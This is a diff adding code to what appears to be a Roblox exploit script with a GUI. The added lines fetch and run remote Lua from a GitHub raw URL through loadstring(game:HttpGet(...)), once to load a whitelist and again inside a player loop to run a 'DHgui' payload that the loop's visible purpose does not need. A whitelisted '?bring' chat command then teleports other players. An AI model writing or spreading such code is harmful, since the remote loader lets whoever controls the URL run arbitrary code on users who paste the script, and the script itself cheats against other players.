@@ -1,5 +1,40 @@
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4, 88, 34)
 
+local WhitelistedUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterJohn13/stuff/main/wl", true))()
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+
+    local playerName = game.Players.LocalPlayer.Name
+    
+    if WhitelistedUsers[playerName] then
+
+        if msg:sub(1, 7) == "?bring " then
+            local targetName = msg:sub(8)
+            
+            if targetName == "." then
+                for _, player in pairs(game.Players:GetPlayers()) do
+                    local success, result = pcall(function()
+                        return loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterJohn13/stuff/main/DHgui", true))()
+                    end)
+                    
+
+                    if success and result then
+                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                            player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        end
+                    end
+                end
+            else
+                local targetPlayer = game.Players:FindFirstChild(targetName)
+                
+                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    targetPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end
+    end
+end)
+
 local GalaxyGui = Instance.new("ScreenGui")
 local Galaxy = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
